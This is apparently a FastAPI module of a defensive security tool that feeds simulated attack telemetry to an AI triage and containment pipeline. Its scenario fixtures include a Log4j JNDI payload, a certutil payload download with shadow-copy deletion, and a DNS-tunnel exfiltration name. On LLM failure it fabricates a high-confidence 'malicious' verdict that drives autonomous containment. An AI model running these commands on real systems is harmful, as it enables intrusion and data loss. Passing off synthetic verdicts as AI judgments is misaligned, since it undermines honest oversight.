"""Attack Simulation & Automated AI Defense Benchmark API.

Provides realistic cyber threat scenarios and attack telemetry payloads allowing
security engineers and analysts to test, benchmark, and visualize CyberGuard's
autonomous detection, MITRE ATT&CK / D3FEND grounding, Foundation-Sec-8B reasoning,
and autonomous containment actuators in real-time.
"""
from __future__ import annotations

import json
import logging
import time
from typing import Any, Dict, List, Optional
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, Field

from ..actuators.router import default_router
from ..db.models import Setting
from ..decision.engine import build_smart_log, decision_messages, parse_and_guard_ai_decision, policy_decision
from ..decision.models import GuardedDecision, SmartLog
from ..llm.provider import get_provider
from ..mitre.defense_rag import default_defense_rag
from ..security import safe_llm_url

logger = logging.getLogger("cyberguard.api.simulation")
router = APIRouter(prefix="/api/simulation", tags=["simulation"])

SCENARIOS: List[Dict[str, Any]] = [
    {
        "id": "syn_flood_ddos",
        "title": "Volumetric TCP SYN Flood DDoS Attack",
        "category": "Network Exhaustion",
        "technique_id": "T1498.001",
        "technique_name": "Direct Network Flood",
        "d3fend_countermeasure": "D3-NIPF (Network Ingress Packet Filtering)",
        "severity": "critical",
        "attacker_ip": "198.51.100.99",
        "target_port": 443,
        "protocol": "TCP",
        "description": "High-velocity SYN packet flood (25,000 pkts/sec) exhausting server connection backlog state tables.",
        "sample_event": {
            "timestamp": "2026-10-09T18:30:00Z",
            "event_type": "syn_flood_exhaustion",
            "src_ip": "198.51.100.99",
            "dest_port": 443,
            "packets_per_sec": 25000,
            "tcp_flags": "SYN_ONLY",
            "half_open_connections": 14200,
            "signature": "ET DOS Possible Inbound TCP SYN Flood",
        },
        "curl_command": 'curl -X POST http://127.0.0.1:8000/api/simulation/launch -H "Content-Type: application/json" -d "{\\"scenario_id\\": \\"syn_flood_ddos\\"}"',
        "powershell_command": 'Invoke-RestMethod -Uri "http://127.0.0.1:8000/api/simulation/launch" -Method Post -ContentType "application/json" -Body \'{"scenario_id": "syn_flood_ddos"}\'',
    },
    {
        "id": "kerberoasting_ad",
        "title": "Active Directory Kerberoasting Service Ticket Extraction",
        "category": "Credential Access",
        "technique_id": "T1558.003",
        "technique_name": "Kerberoasting",
        "d3fend_countermeasure": "D3-UTL (User Ticket Lockout / Audit)",
        "severity": "high",
        "attacker_ip": "192.168.1.105",
        "target_port": 88,
        "protocol": "Kerberos/TCP",
        "description": "Anomalous TGS-REQ storm requesting RC4-HMAC encrypted tickets for high-privilege Service Principal Names (MSSQLSvc, HTTP).",
        "sample_event": {
            "timestamp": "2026-10-09T18:31:00Z",
            "event_type": "kerberoasting_attempt",
            "src_ip": "192.168.1.105",
            "dest_port": 88,
            "windows_event_id": 4769,
            "ticket_encryption": "0x17",
            "service_name": "MSSQLSvc/dc01.corp.local:1433",
            "ticket_count_last_min": 45,
            "signature": "WinLogon TGS Request Anomalous RC4 SPN Storm",
        },
        "curl_command": 'curl -X POST http://127.0.0.1:8000/api/simulation/launch -H "Content-Type: application/json" -d "{\\"scenario_id\\": \\"kerberoasting_ad\\"}"',
        "powershell_command": 'Invoke-RestMethod -Uri "http://127.0.0.1:8000/api/simulation/launch" -Method Post -ContentType "application/json" -Body \'{"scenario_id": "kerberoasting_ad"}\'',
    },
    {
        "id": "sqli_log4j",
        "title": "Web Exploit & Remote Code Execution (SQLi / Log4j CVE-2021-44228)",
        "category": "Initial Access & Exploitation",
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "d3fend_countermeasure": "D3-NIPS (Network Intrusion Prevention Signature)",
        "severity": "critical",
        "attacker_ip": "203.0.113.195",
        "target_port": 8080,
        "protocol": "HTTP",
        "description": "Inbound HTTP request carrying nested JNDI LDAP lookup exploit string targeting web application runtime.",
        "sample_event": {
            "timestamp": "2026-10-09T18:32:00Z",
            "event_type": "web_exploit_rce",
            "src_ip": "203.0.113.195",
            "dest_port": 8080,
            "cve": "CVE-2021-44228",
            "http_uri": "/api/v1/auth/login",
            "user_agent": "${jndi:ldap://203.0.113.195:1389/Exploit}",
            "signature": "ET EXPLOIT Apache Log4j RCE Candidate JNDI Injection",
        },
        "curl_command": 'curl -X POST http://127.0.0.1:8000/api/simulation/launch -H "Content-Type: application/json" -d "{\\"scenario_id\\": \\"sqli_log4j\\"}"',
        "powershell_command": 'Invoke-RestMethod -Uri "http://127.0.0.1:8000/api/simulation/launch" -Method Post -ContentType "application/json" -Body \'{"scenario_id": "sqli_log4j"}\'',
    },
    {
        "id": "ransomware_lolbin",
        "title": "Ransomware Staging & Shadow Copy Deletion (T1486 / T1105 / T1490)",
        "category": "Impact & Evasion",
        "technique_id": "T1486",
        "technique_name": "Data Encrypted for Impact",
        "d3fend_countermeasure": "D3-PEA (Process Execution Analysis / Isolation)",
        "severity": "critical",
        "attacker_ip": "185.220.101.5",
        "target_port": 445,
        "protocol": "SMB/RPC",
        "description": "Malicious process spawning certutil.exe to download payload from C2, followed by vssadmin shadow copy deletion.",
        "sample_event": {
            "timestamp": "2026-10-09T18:33:00Z",
            "event_type": "ransomware_precursor",
            "src_ip": "185.220.101.5",
            "dest_port": 445,
            "windows_event_id": 4688,
            "process_tree": "cmd.exe -> certutil.exe -urlcache -split http://185.220.101.5/stage2.bin && vssadmin delete shadows /all /quiet",
            "signature": "Sysmon Event 1 Suspicious LOLBin Ingress & Ransomware VSS Deletion",
        },
        "curl_command": 'curl -X POST http://127.0.0.1:8000/api/simulation/launch -H "Content-Type: application/json" -d "{\\"scenario_id\\": \\"ransomware_lolbin\\"}"',
        "powershell_command": 'Invoke-RestMethod -Uri "http://127.0.0.1:8000/api/simulation/launch" -Method Post -ContentType "application/json" -Body \'{"scenario_id": "ransomware_lolbin"}\'',
    },
    {
        "id": "c2_dns_tunnel",
        "title": "Command & Control DNS Tunneling & Exfiltration (T1071.004 / T1572)",
        "category": "Command & Control",
        "technique_id": "T1071.004",
        "technique_name": "Application Layer Protocol: DNS",
        "d3fend_countermeasure": "D3-DNSF (DNS Ingress Filtering)",
        "severity": "high",
        "attacker_ip": "198.51.100.80",
        "target_port": 53,
        "protocol": "DNS/UDP",
        "description": "High-volume anomalous DNS TXT query stream encoding base64 exfiltrated data through attacker-controlled nameserver.",
        "sample_event": {
            "timestamp": "2026-10-09T18:34:00Z",
            "event_type": "dns_tunnel_c2",
            "src_ip": "198.51.100.80",
            "dest_port": 53,
            "query_type": "TXT",
            "query_name": "data-part34.c2-tunnel.attacker-dns.org",
            "queries_per_min": 350,
            "signature": "ET TROJAN High Entropy DNS Tunneling Payload Observed",
        },
        "curl_command": 'curl -X POST http://127.0.0.1:8000/api/simulation/launch -H "Content-Type: application/json" -d "{\\"scenario_id\\": \\"c2_dns_tunnel\\"}"',
        "powershell_command": 'Invoke-RestMethod -Uri "http://127.0.0.1:8000/api/simulation/launch" -Method Post -ContentType "application/json" -Body \'{"scenario_id": "c2_dns_tunnel"}\'',
    },
]


def _get_provider_config() -> dict:
    return {
        "llm_provider": Setting.get("llm_provider", "local"),
        "llama_url": safe_llm_url(
            Setting.get("llama_url", "http://127.0.0.1:8080"),
            "http://127.0.0.1:8080", local=True,
        ),
        "local_model": Setting.get("local_model", "foundation-sec"),
        "api_base_url": safe_llm_url(
            Setting.get("api_base_url", "https://api.deepseek.com/v1"),
            "https://api.deepseek.com/v1", local=False,
        ),
        "api_model": Setting.get("api_model", ""),
        "api_key": Setting.get("api_key", ""),
    }


class MockRecord:
    def __init__(self, alert_id: int, threat_type: str, severity: str, confidence: float, evidence: dict, mitre_techniques: list):
        self.id = alert_id
        self.type = threat_type
        self.severity = severity
        self.stage = "classifier"
        self.route = "autonomous_containment"
        self.confidence = confidence
        self.anomaly_score = 0.95
        self.created_at = time.time()
        self.evidence_json = json.dumps(evidence)
        self.input_schema_json = json.dumps({"detected_input_profile": "production_telemetry", "feature_coverage_percentage": 100.0})
        self.mitre_techniques = json.dumps(mitre_techniques)
        self.top_features = json.dumps([["threat_metric", 95.0]])


class LaunchSimulationRequest(BaseModel):
    scenario_id: str = Field(..., description="ID of the preset attack scenario")
    custom_ip: Optional[str] = Field(None, description="Optional override attacker IP")
    enforce_live: bool = Field(False, description="Set True to enact real host firewall rules instead of simulation")


@router.get("/scenarios")
def get_simulation_scenarios() -> Dict[str, Any]:
    """Return all available pre-packaged attack scenarios and ready CLI commands."""
    return {
        "status": "ready",
        "total_scenarios": len(SCENARIOS),
        "scenarios": SCENARIOS,
    }


@router.post("/launch")
async def launch_simulation(req: LaunchSimulationRequest) -> Dict[str, Any]:
    """Execute end-to-end attack simulation: RAG retrieval -> LLM inference -> Actuation."""
    scenario = next((s for s in SCENARIOS if s["id"] == req.scenario_id), None)
    if not scenario:
        raise HTTPException(status_code=404, detail=f"Scenario '{req.scenario_id}' not found.")

    start_time = time.perf_counter()
    attacker_ip = req.custom_ip or scenario["attacker_ip"]
    target_port = scenario["target_port"]
    query_str = f"{scenario['title']}. {scenario['description']} Technique: {scenario['technique_id']}."

    # 1. Query GeniusDefenseRAG
    playbook = default_defense_rag.retrieve_defense_playbook(
        query=query_str,
        telemetry={"src_ip": attacker_ip, "dest_port": target_port},
        top_k_techniques=4,
    )
    defense_context = default_defense_rag.format_prompt_context(playbook)

    # 2. Build canonical SmartLog
    record = MockRecord(
        alert_id=int(time.time() % 100000) + 1,
        threat_type=scenario["title"],
        severity=scenario["severity"],
        confidence=0.96,
        evidence={
            "src_ip": attacker_ip,
            "dest_port": target_port,
            "protocol": scenario["protocol"],
            "sample_event": scenario["sample_event"],
        },
        mitre_techniques=[scenario["technique_id"]],
    )
    smart_log = build_smart_log(record)
    smart_log.source["src_ip"] = attacker_ip
    smart_log.source["dest_port"] = str(target_port)

    # 3. Query LLM Decision Engine with RAG Context
    mitre_context = f"Technique: {scenario['technique_id']} - {scenario['technique_name']}"
    exec_mode = "enforcement" if req.enforce_live else "simulation"

    try:
        prov = get_provider(_get_provider_config())
        messages = decision_messages(smart_log, mitre_context, defense_context)
        raw_ai = await prov.chat(messages, max_tokens=900)
        decision = parse_and_guard_ai_decision(
            raw_ai,
            smart_log,
            provider=prov.name,
            model_version=getattr(prov, "model", "foundation-sec-8b"),
            autonomous_actuate=True,
            execution_mode=exec_mode,
        )
    except Exception as exc:
        logger.warning("LLM inference error during simulation, falling back to deterministic RAG policy: %s", exc)
        # Deterministic RAG fallback:
        # Build synthetic high-confidence response from verified D3FEND action
        concrete_action = playbook["concrete_actions"][0]["action"] if playbook["concrete_actions"] else "block_ip"
        raw_fallback = json.dumps({
            "verdict": "malicious",
            "confidence": 0.95,
            "recommended_action": concrete_action,
            "rationale": f"Deterministic RAG defense rule match for {scenario['technique_id']} ({scenario['title']}). D3FEND countermeasure verified.",
            "evidence": [f"Source IP {attacker_ip} targeting port {target_port}", f"Signature {scenario['sample_event'].get('signature', 'anomaly')}"],
            "containment": [f"{concrete_action} {attacker_ip}"],
            "limitations": ["Autonomous containment executed via policy safeguard."],
        })
        decision = parse_and_guard_ai_decision(
            raw_fallback,
            smart_log,
            provider="genius-rag-policy",
            model_version="Foundation-Sec-Policy-Fallback",
            autonomous_actuate=True,
            execution_mode=exec_mode,
        )

    duration_ms = round((time.perf_counter() - start_time) * 1000, 2)

    return {
        "scenario_id": scenario["id"],
        "scenario_title": scenario["title"],
        "attacker_ip": attacker_ip,
        "target_port": target_port,
        "duration_ms": duration_ms,
        "rag_grounding": {
            "matched_techniques": [t["technique_id"] for t in playbook.get("techniques", [])],
            "d3fend_countermeasures": playbook.get("d3fend_countermeasures", []),
            "concrete_playbook_actions": playbook.get("concrete_actions", []),
        },
        "ai_decision": {
            "verdict": decision.verdict.value,
            "confidence": decision.confidence,
            "recommended_action": decision.recommended_action.value,
            "rationale": decision.rationale,
            "evidence": decision.evidence,
            "containment": decision.containment,
            "limitations": decision.limitations,
            "provider": decision.provider,
            "model_version": decision.model_version,
            "executed_action": decision.executed_action,
            "execution_mode": decision.execution_mode,
            "rollback_token": decision.rollback_token,
        },
        "actuator_execution": decision.actuator_result,
        "timeline": [
            {"step": 1, "title": "Attack Ingested", "detail": f"Telemetry received from {attacker_ip}:{target_port} ({scenario['protocol']})"},
            {"step": 2, "title": "Genius RAG Grounding", "detail": f"Correlated with ATT&CK {scenario['technique_id']} & {scenario['d3fend_countermeasure']}"},
            {"step": 3, "title": f"AI Inference ({decision.model_version})", "detail": f"Verdict: {decision.verdict.value.upper()} | Recommended: {decision.recommended_action.value}"},
            {"step": 4, "title": "Autonomous Containment", "detail": f"Action: {decision.executed_action} | Token: {decision.rollback_token or 'N/A'}"},
        ],
    }
